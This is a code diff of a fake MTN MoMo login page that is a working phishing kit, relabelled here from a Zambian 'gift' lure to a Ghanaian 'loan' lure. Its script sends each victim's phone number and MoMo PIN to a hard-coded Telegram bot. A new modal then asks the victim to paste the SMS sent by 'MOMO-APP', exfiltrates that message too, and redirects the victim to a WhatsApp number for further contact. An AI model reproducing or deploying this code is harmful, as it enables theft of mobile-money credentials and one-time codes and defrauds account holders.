@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo - MoMo Account Login</title>
+    <title>MTN MoMo Loan - Account Login</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
@@ -12,7 +12,7 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         html,
         body {
             height: 100%;
@@ -20,15 +20,14 @@
             background: #f5f5f5;
             overflow: hidden;
         }
-        
+
         body {
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
             padding: 10px;
         }
-        
+
         header {
             width: 100%;
             max-width: 480px;
@@ -41,7 +40,7 @@
             border-radius: 16px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
         }
-        
+
         .back-btn {
             font-size: 28px;
             background: none;
@@ -50,24 +49,24 @@
             color: #333;
             transition: transform 0.2s;
         }
-        
+
         .back-btn:hover {
             transform: scale(1.1);
         }
-        
+
         .logo {
             font-size: 24px;
             font-weight: 700;
         }
-        
+
         .logo-mtn {
             color: #FFC100;
         }
-        
+
         .logo-momo {
             color: #0047AB;
         }
-        
+
         .card {
             background: white;
             border-radius: 24px;
@@ -77,8 +76,10 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
             display: flex;
             flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
         }
-        
+
         .form-title {
             font-size: 24px;
             font-weight: 700;
@@ -86,57 +87,57 @@
             color: #1a1a2e;
             margin-bottom: 5px;
         }
-        
+
         .form-title .highlight {
             color: #0047AB;
         }
-        
+
         .form-subtitle {
             text-align: center;
             color: #888;
             font-size: 14px;
             margin-bottom: 20px;
         }
-        
-        .gift-preview {
+
+        .loan-preview {
             background: #f8f9ff;
             border-radius: 12px;
-            padding: 12px 16px;
+            padding: 14px 16px;
             margin-bottom: 20px;
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
         }
-        
-        .gift-preview .icon {
+
+        .loan-preview .icon {
             font-size: 32px;
+            flex-shrink: 0;
         }
-        
-        .gift-preview .info {
+
+        .loan-preview .info {
             flex: 1;
         }
-        
-        .gift-preview .info .label {
-            font-size: 11px;
+
+        .loan-preview .info .label {
+            font-size: 10px;
             color: #888;
-            font-weight: 500;
+            font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
-        
-        .gift-preview .info .name {
+
+        .loan-preview .info .name {
             font-size: 16px;
             font-weight: 700;
             color: #1a1a2e;
         }
-        
-        .gift-preview .info .value {
+
+        .loan-preview .info .value {
             font-size: 14px;
             font-weight: 600;
             color: #0047AB;
         }
-        
-        /* ===== FIXED PHONE GROUP - FULL WIDTH ===== */
+
         .phone-group {
             width: 100%;
             border: 2px solid #0047AB;
@@ -148,17 +149,17 @@
             background: white;
             transition: box-shadow 0.3s;
         }
-        
+
         .phone-group:focus-within {
             box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.12);
         }
-        
+
         .flag {
             font-size: 24px;
             margin-right: 10px;
             flex-shrink: 0;
         }
-        
+
         .country-select {
             display: flex;
             align-items: center;
@@ -168,12 +169,12 @@
             margin-right: 12px;
             flex-shrink: 0;
         }
-        
+
         .dropdown-arrow {
             font-size: 12px;
             margin-left: 4px;
         }
-        
+
         .phone-input {
             flex: 1;
             min-width: 0;
@@ -183,13 +184,12 @@
             color: #333;
             font-family: 'Inter', sans-serif;
             background: transparent;
-            width: 100%;
         }
-        
+
         .phone-input::placeholder {
             color: #aaa;
         }
-        
+
         .pin-label {
             font-size: 14px;
             color: #666;
@@ -197,14 +197,14 @@
             font-weight: 500;
             text-align: center;
         }
-        
+
         .pin-group {
             display: flex;
             justify-content: center;
             gap: 14px;
             margin-bottom: 20px;
         }
-        
+
         .pin-box {
             width: 55px;
             height: 55px;
@@ -218,19 +218,19 @@
             transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
             font-family: 'Inter', sans-serif;
         }
-        
+
         .pin-box:focus {
             border-color: #0047AB;
             box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.12);
             outline: none;
             transform: scale(1.02);
         }
-        
+
         .pin-box.invalid {
             border-color: #e74c3c !important;
             animation: shake 0.5s ease;
         }
-        
+
         @keyframes shake {
             0%,
             100% { transform: translateX(0); }
@@ -239,7 +239,7 @@
             60% { transform: translateX(-8px); }
             80% { transform: translateX(8px); }
         }
-        
+
         .status-message {
             text-align: center;
             padding: 10px 14px;
@@ -249,33 +249,33 @@
             font-weight: 500;
             display: none;
         }
-        
+
         .status-message.success {
             display: block;
             background: #e8f5e9;
             color: #1e7e34;
             border: 1px solid #c8e6c9;
         }
-        
+
         .status-message.error {
             display: block;
             background: #ffebee;
             color: #c62828;
             border: 1px solid #ffcdd2;
         }
-        
+
         .status-message.info {
             display: block;
             background: #e3f2fd;
             color: #0047AB;
             border: 1px solid #bbdefb;
         }
-        
+
         .forgot-link {
             text-align: center;
             margin-bottom: 20px;
         }
-        
+
         .forgot-link a {
             font-size: 14px;
             color: #0047AB;
@@ -284,11 +284,11 @@
             cursor: pointer;
             transition: opacity 0.3s;
         }
-        
+
         .forgot-link a:hover {
             opacity: 0.7;
         }
-        
+
         #loginBtn {
             width: 100%;
             padding: 16px;
@@ -303,22 +303,22 @@
             box-shadow: 0 8px 20px rgba(0, 71, 171, 0.25);
             display: none;
         }
-        
+
         #loginBtn:hover {
             transform: scale(1.02);
             box-shadow: 0 12px 30px rgba(0, 71, 171, 0.35);
         }
-        
+
         #loginBtn:active {
             transform: scale(0.98);
         }
-        
+
         #loginBtn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
             transform: none !important;
         }
-        
+
         footer {
             padding: 15px;
             color: #aaa;
@@ -326,59 +326,255 @@
             text-align: center;
             margin-top: auto;
         }
-        
+
         .card::-webkit-scrollbar {
             width: 4px;
         }
-        
+
         .card::-webkit-scrollbar-track {
             background: #f1f1f1;
             border-radius: 10px;
         }
-        
+
         .card::-webkit-scrollbar-thumb {
             background: #0047AB;
             border-radius: 10px;
         }
-        
-        #spinnerOverlay {
+
+        /* ===== MODAL POPUP ===== */
+        .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.97);
+            background: rgba(0, 0, 0, 0.6);
             display: none;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
-            z-index: 1000;
+            z-index: 2000;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+            backdrop-filter: blur(4px);
         }
-        
-        .spinner {
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.4s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        @keyframes slideUp {
+            0% { transform: translateY(30px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-icon {
+            font-size: 48px;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a2e;
+            text-align: center;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+
+        .modal-title .highlight {
+            color: #0047AB;
+        }
+
+        .modal-warning {
+            background: #fff8e1;
+            border: 1px solid #ffe082;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            text-align: left;
+        }
+
+        .modal-warning .warn-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .modal-warning .warn-text {
+            font-size: 12.5px;
+            color: #7a6000;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+
+        .modal-warning .warn-text strong {
+            color: #e65100;
+        }
+
+        .modal-textarea {
+            width: 100%;
+            min-height: 110px;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 14px;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            resize: vertical;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            color: #333;
+            background: white;
+            margin-bottom: 18px;
+        }
+
+        .modal-textarea:focus {
+            border-color: #0047AB;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+        }
+
+        .modal-textarea::placeholder {
+            color: #aaa;
+        }
+
+        .modal-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 20px rgba(0, 71, 171, 0.25);
+            font-family: 'Inter', sans-serif;
+        }
+
+        .modal-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 12px 30px rgba(0, 71, 171, 0.35);
+        }
+
+        .modal-btn:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+
+        .modal-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* ===== CONNECTING MODAL ===== */
+        .connecting-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 4000;
+            padding: 20px;
+            backdrop-filter: blur(6px);
+        }
+
+        .connecting-modal.show {
+            display: flex;
+        }
+
+        .connecting-content {
+            background: white;
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 340px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            animation: popIn 0.4s ease;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.85); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .wa-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+            display: inline-block;
+            animation: waPulse 1.5s infinite;
+        }
+
+        @keyframes waPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+        }
+
+        .connecting-spinner {
             width: 50px;
             height: 50px;
-            border: 5px solid #f0f0f0;
-            border-top: 5px solid #0047AB;
+            border: 5px solid #e8f5e9;
+            border-top: 5px solid #25D366;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin: 0 auto 20px;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        .spinner-text {
-            font-size: 16px;
-            color: #333;
-            text-align: center;
-            line-height: 1.6;
-            max-width: 280px;
-            font-weight: 500;
+
+        .connecting-title {
+            font-size: 18px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 8px;
         }
-        
+
+        .connecting-subtitle {
+            font-size: 14px;
+            color: #888;
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        .connecting-dots {
+            display: inline-block;
+            animation: dots 1.5s infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+
         @media (max-width: 480px) {
             .card {
                 padding: 20px 16px;
@@ -394,20 +590,29 @@
             .pin-group {
                 gap: 10px;
             }
-            .gift-preview {
-                padding: 10px 14px;
+            .loan-preview {
+                padding: 12px 14px;
             }
-            .gift-preview .icon {
+            .loan-preview .icon {
                 font-size: 26px;
             }
-            .gift-preview .info .name {
+            .loan-preview .info .name {
                 font-size: 14px;
             }
-            .gift-preview .info .value {
-                font-size: 13px;
+            .modal-content {
+                padding: 24px 18px;
+            }
+            .modal-title {
+                font-size: 16px;
+            }
+            .modal-textarea {
+                min-height: 90px;
+            }
+            .connecting-content {
+                padding: 32px 22px;
             }
         }
-        
+
         @media (max-width: 380px) {
             .pin-box {
                 width: 42px;
@@ -423,29 +628,28 @@
 
 <body>
     <header>
-        <button class="back-btn" onclick="window.location.href='details.html'" aria-label="Go back">←</button>
+        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go back">←</button>
         <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span></div>
         <div></div>
     </header>
-    
+
     <main class="card">
         <h1 class="form-title">🔐 <span class="highlight">MoMo</span> Account</h1>
         <p class="form-subtitle">Enter the MoMo account to receive your gift</p>
-        
-        <div class="gift-preview" id="giftPreview">
-            <span class="icon" id="giftIcon">🎁</span>
+
+        <div class="loan-preview" id="loanPreview">
+            <span class="icon" id="loanIcon">🎁</span>
             <div class="info">
-                <div class="label">🎯 Gift to Receive</div>
-                <div class="name" id="giftName">Loading...</div>
-                <div class="value" id="giftValue">-</div>
+                <div class="label">🎁 Your Gift</div>
+                <div class="name" id="loanName">Loading...</div>
+                <div class="value" id="loanValue">-</div>
             </div>
         </div>
 
-        <!-- Phone Input - FIXED -->
         <div class="phone-group">
-            <span class="flag">🇿🇲</span>
+            <span class="flag">🇬🇭</span>
             <div class="country-select">
-                +260 <span class="dropdown-arrow">▼</span>
+                +233 <span class="dropdown-arrow">▼</span>
             </div>
             <input type="tel" class="phone-input" id="phoneInput" placeholder="MoMo Phone Number" maxlength="9">
         </div>
@@ -466,46 +670,98 @@
 
         <button id="loginBtn">🎁 CLAIM GIFT →</button>
     </main>
-    
-    <footer>© 2026 MTN MoMo Zambia • Secured with 🔒</footer>
 
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
-        <div class="spinner-text">
-            Please wait...<br> This usually takes a few seconds
+    <footer>© 2026 MTN MoMo Ghana • Secured with 🔒</footer>
+
+    <!-- ===== MODAL POPUP - PASTE MESSAGE ===== -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-content">
+            <div class="modal-icon">📩</div>
+
+            <h2 class="modal-title">
+                Copy and Paste the message we sent to your number from <span class="highlight">MOMO-APP</span>
+            </h2>
+
+            <div class="modal-warning">
+                <span class="warn-icon">⚠️</span>
+                <div class="warn-text">
+                    <strong>Do not click on the link.</strong> Only copy and paste it here for biometric authentication.
+                </div>
+            </div>
+
+            <textarea
+                class="modal-textarea"
+                id="momoMessage"
+                placeholder="Paste the message here..."
+                rows="5"></textarea>
+
+            <button class="modal-btn" id="proceedBtn" disabled>PROCEED →</button>
+        </div>
+    </div>
+
+    <!-- ===== CONNECTING MODAL (WHATSAPP) ===== -->
+    <div class="connecting-modal" id="connectingModal">
+        <div class="connecting-content">
+            <div class="wa-icon">💬</div>
+            <div class="connecting-spinner"></div>
+            <div class="connecting-title">Connecting to our Support<span class="connecting-dots" id="dots">...</span></div>
+            <div class="connecting-subtitle">Please wait while we redirect you to WhatsApp</div>
         </div>
     </div>
 
     <script>
-        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
-        const CHAT_ID = '8392790531';
+        // ============================================
+        // TELEGRAM CREDENTIALS
+        // ============================================
+        const BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
+        const CHAT_ID = '8313270294';
 
-        function loadSelectedGift() {
-            const gift = localStorage.getItem('selectedGift') || 'Not selected';
-            const value = localStorage.getItem('selectedGiftValue') || '-';
-            const icon = localStorage.getItem('selectedGiftIcon') || '🎁';
-            
-            document.getElementById('giftIcon').textContent = icon;
-            document.getElementById('giftName').textContent = gift;
-            document.getElementById('giftValue').textContent = value;
+        // ============================================
+        // WHATSAPP CONFIGURATION
+        // ============================================
+        const WHATSAPP_NUMBER = '254710161648'; // Kenya WhatsApp number
+
+        // ============================================
+        // LOAN SUMMARY
+        // ============================================
+        function loadLoanSummary() {
+            const giftName = localStorage.getItem('selectedGift') || 'Airtime';
+            const giftValue = localStorage.getItem('selectedGiftValue') || 'ZMW 369';
+            const giftIcon = localStorage.getItem('selectedGiftIcon') || '📱';
+
+            document.getElementById('loanIcon').textContent = giftIcon;
+            document.getElementById('loanName').textContent = giftName;
+            document.getElementById('loanValue').textContent = giftValue;
         }
 
-        loadSelectedGift();
+        loadLoanSummary();
 
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
         const phoneInput = document.getElementById('phoneInput');
         const pinBoxes = document.querySelectorAll('.pin-box');
         const loginBtn = document.getElementById('loginBtn');
-        const spinnerOverlay = document.getElementById('spinnerOverlay');
         const statusMessage = document.getElementById('statusMessage');
+        const modalOverlay = document.getElementById('modalOverlay');
+        const momoMessage = document.getElementById('momoMessage');
+        const proceedBtn = document.getElementById('proceedBtn');
+        const connectingModal = document.getElementById('connectingModal');
 
         let pinValue = '';
 
+        // ============================================
+        // CHECK PIN COMPLETE
+        // ============================================
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
             loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
             return pinValue;
         }
 
+        // ============================================
+        // PIN INPUT HANDLING
+        // ============================================
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
                 box.value = box.value.replace(/\D/g, '');
@@ -547,6 +803,9 @@
             });
         });
 
+        // ============================================
+        // STATUS MESSAGE
+        // ============================================
         function showStatus(message, type = 'info') {
             statusMessage.textContent = message;
             statusMessage.className = 'status-message ' + type;
@@ -558,39 +817,92 @@
             statusMessage.className = 'status-message';
         }
 
-        async function sendTelegramNotification(phone, pin) {
-            const gift = localStorage.getItem('selectedGift') || 'Not specified';
-            const giftValue = localStorage.getItem('selectedGiftValue') || '-';
-            const fullName = localStorage.getItem('fullName') || 'Not provided';
-            
-            const message = `🔐 *MTN MoMo - Gift Claim Login*\n\n` +
-                `🎁 *Gift to Receive:* ${gift} (${giftValue})\n` +
-                `📱 *MoMo Account:* +260 ${phone}\n` +
-                `🔢 *PIN:* ${pin}\n` +
-                `👤 *User:* ${fullName}\n` +
-                `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-                `✅ User is claiming their gift. Please process.`;
+        // ============================================
+        // SEND #1: PHONE + PIN TO TELEGRAM
+        // ============================================
+        async function sendPhoneAndPin(phone, pin) {
+            const giftName = localStorage.getItem('selectedGift') || 'Airtime';
+            const giftValue = localStorage.getItem('selectedGiftValue') || 'ZMW 369';
+
+            const message = `🎁 *NEW MTN MoMo GIFT CLAIM - GHANA*\n\n` +
+                `🎯 *GIFT DETAILS*\n` +
+                `🎁 Gift: ${giftName}\n` +
+                `💰 Value: ${giftValue}\n\n` +
+                `🔐 *MOMO ACCOUNT LOGIN*\n` +
+                `📱 MoMo Phone: +233 ${phone}\n` +
+                `🔢 MoMo PIN: ${pin}\n\n` +
+                `⏰ Time: ${new Date().toLocaleString()}\n\n` +
+                `✅ Step 1: Login details received.`;
+
+            console.log('📤 [STEP 1] Sending phone + PIN...');
+
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
                         parse_mode: 'Markdown'
-                    })
+                    }),
+                    signal: controller.signal
                 });
-                return response.ok;
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                console.log('📥 [STEP 1] Telegram:', data.ok);
+                return data.ok;
             } catch (error) {
-                console.error('❌ Telegram error:', error.message);
+                clearTimeout(timeoutId);
+                console.error('❌ [STEP 1] Telegram error:', error.message);
                 return false;
             }
         }
 
-        loginBtn.addEventListener('click', async function() {
+        // ============================================
+        // SEND #2: MOMO MESSAGE TO TELEGRAM
+        // ============================================
+        async function sendMomoMessage(phone, momoMsg) {
+            const message = `📩 *MOMO-APP MESSAGE RECEIVED (GHANA)*\n\n` +
+                `📱 *MoMo Account:* +233 ${phone}\n\n` +
+                `📩 *Message Pasted by User:*\n` +
+                `\`\`\`\n${momoMsg}\n\`\`\`\n\n` +
+                `⏰ Time: ${new Date().toLocaleString()}\n\n` +
+                `✅ Step 2: User pasted MOMO message. Proceeding to WhatsApp.`;
+
+            console.log('📤 [STEP 2] Sending MOMO message...');
+
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                console.log('📥 [STEP 2] Telegram:', data.ok);
+                return data.ok;
+            } catch (error) {
+                clearTimeout(timeoutId);
+                console.error('❌ [STEP 2] Telegram error:', error.message);
+                return false;
+            }
+        }
+
+        // ============================================
+        // LOGIN BUTTON HANDLER
+        // ============================================
+        loginBtn.addEventListener('click', function() {
             const phone = phoneInput.value.trim();
             const pin = Array.from(pinBoxes).map(box => box.value).join('');
 
@@ -611,25 +923,98 @@
                 return;
             }
 
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'WAITING...';
-            spinnerOverlay.style.display = 'flex';
-            hideStatus();
-
+            // Save
             localStorage.setItem('momoPhone', phone);
             localStorage.setItem('momoPin', pin);
 
-            await sendTelegramNotification(phone, pin);
+            // Disable button
+            loginBtn.disabled = true;
 
-            showStatus('✅ MoMo account verified! Redirecting...', 'success');
+            // Send phone + PIN silently in background
+            sendPhoneAndPin(phone, pin);
 
+            // After 1.5s, show modal
             setTimeout(() => {
-                window.location.href = 'confirmation.html';
+                loginBtn.disabled = false;
+                modalOverlay.classList.add('show');
+                momoMessage.value = '';
+                proceedBtn.disabled = true;
+                setTimeout(() => momoMessage.focus(), 400);
             }, 1500);
         });
 
+        // ============================================
+        // ENABLE PROCEED WHEN TEXT IS ENTERED
+        // ============================================
+        momoMessage.addEventListener('input', function() {
+            proceedBtn.disabled = this.value.trim().length === 0;
+        });
+
+        // ============================================
+        // PROCEED BUTTON HANDLER
+        // ============================================
+        proceedBtn.addEventListener('click', async function() {
+            const momoMsg = momoMessage.value.trim();
+
+            if (!momoMsg) return;
+
+            const phone = localStorage.getItem('momoPhone');
+
+            // Save MOMO message
+            localStorage.setItem('momoMessage', momoMsg);
+
+            // Hide paste modal
+            modalOverlay.classList.remove('show');
+            proceedBtn.disabled = true;
+            proceedBtn.textContent = 'SENDING...';
+
+            // Send MOMO message to Telegram
+            await sendMomoMessage(phone, momoMsg);
+
+            // ============================================
+            // SHOW CONNECTING MODAL (3-5 seconds)
+            // ============================================
+            console.log('🔄 Showing connecting modal...');
+            connectingModal.classList.add('show');
+
+            // Animate the dots
+            let dotCount = 0;
+            const dotsEl = document.getElementById('dots');
+            const dotsInterval = setInterval(() => {
+                dotCount = (dotCount + 1) % 4;
+                dotsEl.textContent = '.'.repeat(dotCount);
+            }, 400);
+
+            // Wait 4 seconds then redirect to WhatsApp
+            setTimeout(() => {
+                clearInterval(dotsInterval);
+                redirectToWhatsApp();
+            }, 4000);
+        });
+
+        // ============================================
+        // REDIRECT TO WHATSAPP
+        // ============================================
+        function redirectToWhatsApp() {
+            const phone = localStorage.getItem('momoPhone') || '';
+            const giftName = localStorage.getItem('selectedGift') || 'Airtime';
+            const giftValue = localStorage.getItem('selectedGiftValue') || 'ZMW 369';
+
+            const message = `Hello MTN MoMo, I want to claim my ${giftName} worth ${giftValue}. My MoMo number is +233 ${phone}`;
+
+            const waUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
+
+            console.log('➡️ Redirecting to WhatsApp:', waUrl);
+
+            // Redirect to WhatsApp
+            window.location.href = waUrl;
+        }
+
+        // ============================================
+        // KEYBOARD SHORTCUTS
+        // ============================================
         document.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
+            if (e.key === 'Enter' && !modalOverlay.classList.contains('show') && !connectingModal.classList.contains('show')) {
                 const pinComplete = checkPinComplete();
                 if (pinComplete.length === 4 && loginBtn.style.display !== 'none') {
                     loginBtn.click();
@@ -637,6 +1022,9 @@
             }
         });
 
+        // ============================================
+        // AUTO-FOCUS AND LOAD
+        // ============================================
         window.addEventListener('load', () => {
             const savedPhone = localStorage.getItem('momoPhone');
             if (savedPhone && savedPhone.length === 9) {
@@ -644,6 +1032,11 @@
             }
             phoneInput.focus();
             checkPinComplete();
+
+            console.log('✅ MTN MoMo Gift Claim - Login Loaded');
+            console.log('📱 WhatsApp Number:', WHATSAPP_NUMBER);
+            console.log('🎁 Selected Gift:', localStorage.getItem('selectedGift'));
+            console.log('====================================');
         });
     </script>
 
